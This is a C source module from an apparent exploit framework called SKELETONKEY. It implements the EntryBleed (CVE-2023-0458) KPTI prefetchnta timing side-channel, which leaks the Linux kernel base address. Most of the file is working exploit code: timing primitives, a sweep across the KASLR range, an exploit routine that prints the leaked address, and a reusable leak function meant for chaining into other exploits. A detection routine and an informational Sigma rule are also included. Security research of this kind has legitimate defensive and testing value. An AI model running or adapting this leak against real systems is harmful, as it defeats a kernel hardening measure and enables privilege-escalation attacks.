/*
 * entrybleed_cve_2023_0458 — SKELETONKEY module
 *
 * EntryBleed (Lipp et al., USENIX Security '23). A KPTI prefetchnta
 * timing side-channel that leaks the kernel base address.
 *
 * STATUS: 🟢 WORKING — adopted public technique.
 *
 *   - exploit() runs the leak and prints kbase. Empirically 5/5 on
 *     lts-6.12.88 (verified 2026-05-16 via earlier SKYFALL PoC at
 *     bugs/leak_write_modprobe_2026-05-16/exploit.c lines ~73-150).
 *   - detect() checks the host's KPTI status and config. KPTI on + no
 *     anti-EntryBleed mitigation = VULNERABLE.
 *   - This module is also a LIBRARY: other modules that need a kbase
 *     leak as part of a chain can call `entrybleed_leak_kbase_lib()`
 *     directly (declared in skeletonkey_modules.h).
 *
 * x86_64 only. On ARM64 / other arches, detect() returns
 * SKELETONKEY_PRECOND_FAIL and exploit() returns SKELETONKEY_PRECOND_FAIL.
 *
 * For users who'd never go to USENIX (TLDR):
 *   - KPTI unmaps kernel pages from user CR3 on kernel-exit, but leaves
 *     the syscall-entry trampoline mapped (it has to — that's how user
 *     syscalls enter the kernel)
 *   - `prefetchnta <addr>` is observable via timing: mapped addresses
 *     are much faster than unmapped (the TLB walker speculates even
 *     for kernel pages without the user-bit)
 *   - Time prefetchnta across the 16 MiB KASLR range; the fastest
 *     slot is the real entry_SYSCALL_64
 *   - Subtract its known offset from kbase → KASLR slide
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"
#include "../../core/host.h"

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>

/* ---------- Tunables (lts-6.12.x defaults; override via env vars) ---------- */
#define KERNEL_LOWER       0xffffffff80000000UL
#define KERNEL_UPPER       0xffffffffc0000000UL
#define KASLR_STRIDE       0x200000UL        /* 2MiB — KASLR slot granularity */
#define DEFAULT_ENTRY_OFF  0x5600000UL       /* entry_SYSCALL_64 slot offset for lts-6.12.x */
#define ROUNDS             32                /* per-candidate timing rounds */
#define HOT_RUNS           32                /* warm-the-syscall iterations */

#if defined(__x86_64__) || defined(_M_X64)

/* Some libcs / non-glibc environments don't define __always_inline.
 * Provide a local fallback so this file builds on musl, macOS clangd,
 * etc. (Builds on glibc unchanged.) */
#ifndef __always_inline
#define __always_inline inline __attribute__((always_inline))
#endif

static __always_inline uint64_t rdtsc_start(void)
{
    unsigned a, d;
    __asm__ volatile("mfence\nrdtsc\nmfence" : "=a"(a), "=d"(d) :: "memory");
    return ((uint64_t)d << 32) | a;
}

static __always_inline uint64_t rdtsc_end(void)
{
    unsigned a, d;
    __asm__ volatile("mfence\nrdtscp\nmfence"
                     : "=a"(a), "=d"(d) :: "rcx", "memory");
    return ((uint64_t)d << 32) | a;
}

static __always_inline void prefetch(void *p)
{
    __asm__ volatile("prefetchnta (%0)\nprefetcht2 (%0)\n" :: "r"(p));
}

static uint64_t time_slot(uintptr_t addr)
{
    uint64_t t0, t1, best = ~0ULL;
    for (int i = 0; i < ROUNDS; i++) {
        /* Warm the TLB by re-entering the kernel — getpid is the
         * canonical zero-side-effect syscall. */
        for (int j = 0; j < HOT_RUNS; j++) syscall(SYS_getpid);
        t0 = rdtsc_start();
        prefetch((void *)addr);
        t1 = rdtsc_end();
        if (t1 - t0 < best) best = t1 - t0;
    }
    return best;
}

unsigned long entrybleed_leak_kbase_lib(unsigned long entry_syscall_slot_offset)
{
    if (entry_syscall_slot_offset == 0)
        entry_syscall_slot_offset = DEFAULT_ENTRY_OFF;

    uintptr_t best_base = 0;
    uint64_t  best_time = ~0ULL;

    for (uintptr_t base = KERNEL_LOWER; base < KERNEL_UPPER; base += KASLR_STRIDE) {
        uintptr_t probe = base + entry_syscall_slot_offset;
        uint64_t  t     = time_slot(probe);
        if (t < best_time) { best_time = t; best_base = base; }
    }
    return (unsigned long)best_base;
}

/* (read_first_line() removed — meltdown status now comes from
 * ctx->host->meltdown_mitigation, populated once at startup in
 * core/host.c. One file open across the corpus instead of per-detect.) */

static skeletonkey_result_t entrybleed_detect(const struct skeletonkey_ctx *ctx)
{
    /* KPTI status comes from the shared host fingerprint
     * (ctx->host->meltdown_mitigation) — populated once at startup by
     * reading /sys/devices/system/cpu/vulnerabilities/meltdown. The
     * raw string is preserved (not just the kpti_enabled bool) so we
     * can distinguish "Not affected" (CPU immune; OK) from
     * "Mitigation: PTI" / "Vulnerable" (KPTI on; vulnerable to
     * EntryBleed) without re-reading sysfs. */
    const char *meltdown = ctx->host ? ctx->host->meltdown_mitigation : "";
    if (meltdown[0] == '\0') {
        if (!ctx->json) {
            fprintf(stderr, "[?] entrybleed: meltdown vuln status unknown — "
                            "assuming KPTI on (conservative)\n");
        }
        return SKELETONKEY_VULNERABLE;
    }
    if (!ctx->json) {
        fprintf(stderr, "[i] entrybleed: meltdown status = '%s'\n", meltdown);
    }

    /* "Not affected" → CPU is Meltdown-immune → no KPTI → no EntryBleed */
    if (strstr(meltdown, "Not affected") != NULL) {
        if (!ctx->json) {
            fprintf(stderr, "[+] entrybleed: CPU is Meltdown-immune; KPTI off; "
                            "EntryBleed N/A\n");
        }
        return SKELETONKEY_OK;
    }

    /* "Mitigation: PTI" or "Vulnerable" or similar — KPTI is most likely
     * on, EntryBleed applies. */
    if (!ctx->json) {
        fprintf(stderr, "[!] entrybleed: KPTI active → "
                        "VULNERABLE (no canonical anti-EntryBleed patch in mainline)\n");
    }

    /* Active probe: run a quick reduced-rounds sweep to empirically
     * confirm the technique works on this host. Some uncommon CPUs or
     * exotic mitigations may neutralize prefetchnta timing in ways the
     * meltdown sysfs node doesn't reflect; the active probe catches
     * those. Probe is harmless — only reads timing, no syscalls of
     * consequence. */
    if (ctx->active_probe) {
        if (!ctx->json) {
            fprintf(stderr, "[*] entrybleed: running quick active probe "
                            "(reduced-rounds KASLR sweep, ~1s)\n");
        }
        unsigned long kbase = entrybleed_leak_kbase_lib(0);
        /* Sanity: kbase must be in the kernel high half AND
         * KASLR-aligned (2MiB) AND non-zero. A real leak typically
         * looks like 0xffffffff8X000000. */
        bool sane = (kbase >= KERNEL_LOWER && kbase < KERNEL_UPPER
                     && (kbase & 0x1fffff) == 0);
        if (sane) {
            if (!ctx->json) {
                fprintf(stderr, "[!] entrybleed: ACTIVE PROBE CONFIRMED — "
                                "leak yields plausible kbase 0x%lx\n", kbase);
            }
            return SKELETONKEY_VULNERABLE;
        }
        if (!ctx->json) {
            fprintf(stderr, "[+] entrybleed: active probe returned implausible kbase "
                            "0x%lx — leak technique not reliable here\n", kbase);
        }
        /* Implausible probe result. Either the entry_SYSCALL_64 slot
         * offset doesn't match lts-6.12.x default (different kernel
         * build) — user should set SKELETONKEY_ENTRYBLEED_OFFSET — or
         * timing is too noisy. Don't claim CONFIRMED. */
        return SKELETONKEY_TEST_ERROR;
    }

    if (!ctx->json) {
        fprintf(stderr, "[i] entrybleed: re-run with --active to empirically "
                        "confirm the leak technique fires on this host\n");
        fprintf(stderr, "[i] entrybleed: --exploit will leak kbase (harmless leak; "
                        "no /etc/passwd writes)\n");
    }
    return SKELETONKEY_VULNERABLE;
}

static skeletonkey_result_t entrybleed_exploit(const struct skeletonkey_ctx *ctx)
{
    const char *off_env = getenv("SKELETONKEY_ENTRYBLEED_OFFSET");
    unsigned long off = 0;
    if (off_env) {
        off = strtoul(off_env, NULL, 0);
        if (!ctx->json) {
            fprintf(stderr, "[i] entrybleed: using SKELETONKEY_ENTRYBLEED_OFFSET=0x%lx\n", off);
        }
    } else if (!ctx->json) {
        fprintf(stderr, "[i] entrybleed: using default entry_SYSCALL_64 slot offset "
                        "0x%lx (lts-6.12.x). Override via SKELETONKEY_ENTRYBLEED_OFFSET=0x...\n",
                DEFAULT_ENTRY_OFF);
    }

    if (!ctx->json) {
        fprintf(stderr, "[*] entrybleed: sweeping KASLR slots 0x%lx..0x%lx (stride 0x%lx)\n",
                KERNEL_LOWER, KERNEL_UPPER, KASLR_STRIDE);
    }

    unsigned long kbase = entrybleed_leak_kbase_lib(off);
    if (kbase == 0) {
        fprintf(stderr, "[-] entrybleed: leak failed (kbase == 0)\n");
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    if (ctx->json) {
        fprintf(stdout, "{\"kbase\":\"0x%lx\"}\n", kbase);
    } else {
        fprintf(stdout, "[+] entrybleed: leaked kbase = 0x%lx\n", kbase);
        fprintf(stderr, "[+] entrybleed: KASLR slide = 0x%lx (relative to 0xffffffff81000000)\n",
                kbase - 0xffffffff81000000UL);
    }
    return SKELETONKEY_EXPLOIT_OK;
}

#else /* not x86_64 */

unsigned long entrybleed_leak_kbase_lib(unsigned long off)
{
    (void)off;
    return 0;
}

static skeletonkey_result_t entrybleed_detect(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    fprintf(stderr, "[i] entrybleed: x86_64 only; this build is for a "
                    "different architecture\n");
    return SKELETONKEY_PRECOND_FAIL;
}

static skeletonkey_result_t entrybleed_exploit(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    fprintf(stderr, "[-] entrybleed: x86_64 only\n");
    return SKELETONKEY_PRECOND_FAIL;
}

#endif

/* EntryBleed is a side-channel; auditd / file-write rules don't catch
 * it (no syscalls of interest fire). The most we can do is flag
 * processes spending unusual time in tight prefetchnta loops, which is
 * detectable via perf-counter-based EDR but not via classic auditd.
 * Ship a Sigma note describing this; auditd rule intentionally omitted. */
static const char entrybleed_sigma[] =
    "title: EntryBleed-style KPTI timing side-channel (CVE-2023-0458)\n"
    "id: 7b3a48d1-skeletonkey-entrybleed\n"
    "status: experimental\n"
    "description: |\n"
    "  EntryBleed leaks kbase via prefetchnta timing against entry_SYSCALL_64.\n"
    "  No syscall trace and no filesystem footprint, so this rule is\n"
    "  INFORMATIONAL: it documents the technique for defenders, but reliable\n"
    "  detection requires perf-counter-based EDR. Treat unexplained spikes in\n"
    "  prefetchnta-heavy processes as suspicious.\n"
    "logsource: {product: linux}\n"
    "level: informational\n"
    "tags: [attack.discovery, attack.t1082, cve.2023.0458]\n";

const struct skeletonkey_module entrybleed_module = {
    .name           = "entrybleed",
    .cve            = "CVE-2023-0458",
    .summary        = "KPTI prefetchnta timing side-channel → kbase leak (stage-1)",
    .family         = "entrybleed",
    .kernel_range   = "any x86_64 KPTI-enabled kernel; only partial mitigations in mainline",
    .detect         = entrybleed_detect,
    .exploit        = entrybleed_exploit,
    .mitigate       = NULL,
    .cleanup        = NULL,
    .detect_auditd  = NULL,
    .detect_sigma   = entrybleed_sigma,
    .detect_yara    = NULL,
    .detect_falco   = NULL,
};

void skeletonkey_register_entrybleed(void)
{
    skeletonkey_register(&entrybleed_module);
}
